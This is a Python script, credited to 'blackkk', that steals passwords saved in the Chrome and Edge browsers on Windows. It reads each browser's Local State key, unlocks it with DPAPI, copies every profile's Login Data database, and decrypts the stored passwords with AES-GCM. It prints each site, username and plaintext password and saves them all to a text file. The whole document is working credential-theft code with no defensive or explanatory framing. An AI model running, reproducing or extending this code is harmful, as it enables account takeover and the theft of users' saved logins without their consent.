import os
import re
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil

# Global Constants
BROWSERS = {
    "Google Chrome": {
        "local_state": os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State" % (os.environ['USERPROFILE'])),
        "user_data": os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data" % (os.environ['USERPROFILE']))
    },
    "Microsoft Edge": {
        "local_state": os.path.normpath(r"%s\AppData\Local\Microsoft\Edge\User Data\Local State" % (os.environ['USERPROFILE'])),
        "user_data": os.path.normpath(r"%s\AppData\Local\Microsoft\Edge\User Data" % (os.environ['USERPROFILE']))
    }
}

def get_secret_key(local_state_path):
    print(f"[*] Reading local state file from {local_state_path}...")
    with open(local_state_path, "r", encoding='utf-8') as f:
        local_state = json.loads(f.read())
    secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    secret_key = secret_key[5:]  #
    secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
    print("[+] Secret key retrieved successfully.")
    return secret_key

def decrypt_password(ciphertext, secret_key):
    print("[*] Decrypting password...")
    initialisation_vector = ciphertext[3:15]
    encrypted_password = ciphertext[15:-16]
    cipher = AES.new(secret_key, AES.MODE_GCM, initialisation_vector)
    decrypted_pass = cipher.decrypt(encrypted_password).decode()
    print("[+] Password decrypted successfully.")
    return decrypted_pass

def get_db_connection(login_db_path):
    print(f"[*] Copying login database from {login_db_path}...")
    shutil.copy2(login_db_path, "Loginvault.db")
    return sqlite3.connect("Loginvault.db")

def extract_passwords(browser_name, local_state_path, user_data_path, output_file):
    print(f"[*] Starting password extraction for {browser_name}...")
    
    if not os.path.exists(local_state_path):
        print(f"[-] {browser_name} not found on this system.")
        return
    
    secret_key = get_secret_key(local_state_path)
    
    folders = [element for element in os.listdir(user_data_path) if re.search("^Profile*|^Default$", element) is not None]
    
    for folder in folders:
        print(f"[*] Processing folder: {folder}")
        login_db_path = os.path.normpath(r"%s\%s\Login Data" % (user_data_path, folder))
        conn = get_db_connection(login_db_path)
        
        if secret_key and conn:
            cursor = conn.cursor()
            cursor.execute("SELECT action_url, username_value, password_value FROM logins")
            
            for index, login in enumerate(cursor.fetchall()):
                url, username, ciphertext = login
                if url and username and ciphertext:
                    decrypted_password = decrypt_password(ciphertext, secret_key)
                    output_file.write(f"{browser_name} | {index} | {url} | {username} | {decrypted_password}\n")
                    print(f"[+] {browser_name} | URL: {url}\n    Username: {username}\n    Password: {decrypted_password}\n")
            
            cursor.close()
            conn.close()
            os.remove("Loginvault.db")
            print("[*] Temporary database removed.")

def main():
    print("Dev by: blackkk")
    print("[*] Starting browser password extraction...")
    
    with open('decrypted_password.txt', mode='w', encoding='utf-8') as output_file:
        output_file.write("Dev by: everythingBlackkk\n\n")
        output_file.write("Browser | Index | URL | Username | Password\n")
        output_file.write("-" * 70 + "\n")
        
        for browser_name, paths in BROWSERS.items():
            extract_passwords(browser_name, paths["local_state"], paths["user_data"], output_file)
    
    print("[+] All passwords have been extracted and saved to 'decrypted_password.txt'.")

if __name__ == '__main__':
    main()
